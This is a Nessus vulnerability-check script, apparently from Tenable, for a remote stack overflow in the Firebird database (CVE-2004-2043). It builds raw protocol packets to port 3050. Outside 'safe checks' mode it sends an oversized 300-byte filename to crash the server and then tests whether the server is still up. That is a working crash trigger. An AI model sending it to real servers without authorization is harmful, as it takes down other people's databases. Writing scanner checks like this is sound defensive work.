#
# Copyright (C) 2004 Tenable Network Security
#

if(description)
{
 script_id(12246);
 script_cve_id("CVE-2004-2043");
 script_bugtraq_id(10446);
 if (defined_func("script_xref")) {
   script_xref(name:"OSVDB", value:"6408");
   script_xref(name:"OSVDB", value:"6624");
 }
 script_version ("$Revision: 1.8 $");
 name["english"] = "Firebird DB remote buffer overflow";
 script_name(english:name["english"]);
 desc["english"] =
"The remote host is vulnerable to a remote stack-based
overflow.  An attacker, exploiting this hole, would be
given full access to the target machine.  Versions of
Firebird database less than 1.5.0 are reported vulnerable
to this overflow.

Solution : Upgrade to version 1.5.0 or higher.

Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Firebird DB remote buffer overflow";
 script_summary(english:summary["english"]);

 script_category(ACT_MIXED_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "Remote file access";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports(3050,139,445);
 exit(0);
}


# start script


DEBUG = 0;

function firebird_request(myuser,myfile, ptype)
{
	req = req2 = NULL;
	opcode = raw_string(0x00,0x00,0x00,0x01);
	stuff1 = raw_string(0x00,0x00,0x00,0x13,0x00,0x00,
	                    0x00,0x02,0x00,0x00,0x00,0x1d,
                            0x00,0x00,0x00);

	myfilelen = raw_string(strlen(myfile));
       	stuff2 = raw_string(0x00,0x00,0x00,0x00,0x00,0x00,
	                    0x02,0x00,0x00,0x00,0x1a,0x01);

	name = string("SCAN CHECK");
	name += raw_string(0x04);
	mynamelen = raw_string(strlen(name));
	machinename = string("nessusscan");
	mymachinelen = raw_string(strlen(machinename));

        req = opcode + stuff1 + myfilelen + myfile + stuff2 + mynamelen +
              name + mymachinelen + machinename;

	req += raw_string(0x06,0x00,0x00,0x00,0x00,0x00,0x00,
                          0x08,0x00,0x00,0x00,0x01,0x00,0x00,
                          0x00,0x02,0x00,0x00,0x00,0x03,0x00,
		          0x00,0x00,0x02,0x00,0x00,0x00,0x0a,
                          0x00,0x00,0x00,0x01,0x00,0x00,0x00,
		          0x02,0x00,0x00,0x00,0x03,0x00,0x00,
                          0x00,0x04);

	if (ptype == "attach")
	{
 		opcode = raw_string(0x00,0x00,0x00,0x13);
		stuff1 = raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x00);
                myfilelen = raw_string(strlen(myfile));
		stuff2 = raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x20,
                                    0x01,0x1c);
		myuserlen = raw_string(strlen(myuser), 0x1e);
	 	stuff3 = string("yWIQESaQ6ty");
		stuff4 = raw_string(0x3a,0x04,0x00,0x00,0x00,0x00,0x3e,0x00);	
		req2 = opcode + stuff1 + myfilelen + myfile + stuff2 + myuserlen +
		      myuser + stuff3 + stuff4;
	}
			
				
        soc = open_sock_tcp(port);
        if (! soc)
	{
	        return("ERROR"); 
		if (DEBUG)
		{
			display("can't open a socket to remote host\n");
		}
	}

        send(socket:soc, data:req);

	if (ptype == "attach")
	{
		r = recv(socket:soc, length:16);
		if ( r && (ord(r[3]) == 3) )
		{
			send(socket:soc, data:req2);
		}
		else
		{
			close(soc);

			if (DEBUG)
			{
				display("did not receive a reply after connect packet\n");
			}

			return("ERROR");
		}
	}

	r = recv(socket:soc, length:16);

	close(soc);

	if (strlen(r) > 4)
	{
		return(r);
	}
	else
	{
		if (DEBUG)
		{
			display(string("recv only returned ", strlen(r), " bytes\n"));
		}
		return("ERROR");
	}
}
	        
	        

	


port = 3050;
if (! get_tcp_port_state(port) )
	exit(0);

reply = firebird_request(myfile:"nessusr0x", ptype:"connect");

if (reply == "ERROR")
	exit(0);

if (  ( ord(reply[0]) == 0) &&
      ( ord(reply[1]) == 0) &&
      ( ord(reply[2]) == 0) &&
      ( ord(reply[3]) == 3)   ) 
{
	#mywarning = string("The remote host seems to be running the Firebird database server\n");
	#security_note(port:port, data:mywarning);
	exit(0);
}


if ( safe_checks() )
{
	# patched systems will *not* respond to a 299 byte filename request 
	reply = firebird_request(myuser:"nessusr0x" ,myfile:string(crap(299)), ptype:"attach");
	
	if (reply == "ERROR")
		exit(0);

	if (strlen(reply) > 0)
	{
		security_hole(port);
		exit(0);
	}

}
else
{
	reply = firebird_request(myuser:"nessusr0x" ,myfile:string(crap(300)), ptype:"attach");
	if (DEBUG)
	{
		display("sent malicious attach packet\n");
	}

	reply = firebird_request(myfile:"nessusr0x", ptype:"connect");

	if (DEBUG)
	{
		display("sending final connect request to DB\n");
	}

	if (reply == "ERROR")
	{
		security_hole(port);
		exit(0);
	}
}








